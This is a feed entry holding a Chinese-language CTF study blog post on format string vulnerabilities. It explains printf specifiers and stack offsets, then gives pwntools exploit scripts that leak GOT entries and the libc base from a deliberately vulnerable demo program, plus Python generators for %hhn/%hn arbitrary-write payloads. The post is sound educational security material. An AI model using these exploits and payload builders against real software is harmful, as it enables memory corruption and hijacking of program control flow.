    <link href="http://chumen77.xyz/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/03/12/格式化字符串漏洞小总结（上）/</id>
    <published>2020-03-12T13:13:41.000Z</published>
    <updated>2020-04-03T09:00:26.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>需要重点关注的pattern：</p><ol><li>parameter ：n$，获取格式化字符串中的指定参数</li><li>field width ：输出的最小宽度</li><li>precision ：输出的最大长度</li><li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li><li>type :<pre><code class="c"> d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， &#39;%&#39;字面值，不接受任何 flags, width。</code></pre></li></ol><p>参数：就是是要对应输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol><li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li><li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p><h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p><h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p><h6 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p><h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p><h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol><li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li><li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p><h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul><li>使用方法类似于%s的任意地址读取，只是换成了%n。</li><li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li></ul><h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p><h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p><h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p><ol><li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p></li><li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></p></li><li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p></li></ol><p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p><ul><li>前面已经输出的字符数小于这次要输出的字符数</li><li>前面已经输出的字符数等于于这次要输出的字符数</li><li>前面已经输出的字符数大于这次要输出的字符数</li></ul><p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p><p>单字节：</p><pre><code class="python"># prev 前面已经输出多少字符# val 要写入的值# idx  偏移def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#搭配：prev = 0 payload = &quot;&quot;# x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样# idx是偏移，key是要写入的目标值for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>双字节：</p><pre><code class="python">#跟上个基本一样，只是改了部分地方def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p><h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):你控制的第一个格式化程序的偏移量</li><li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li><li>numbwritten (int):已经由 printf 函数写入的字节数</li><li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li></ul><p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p><ul><li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li><li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li></ul><p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（上）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（上）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
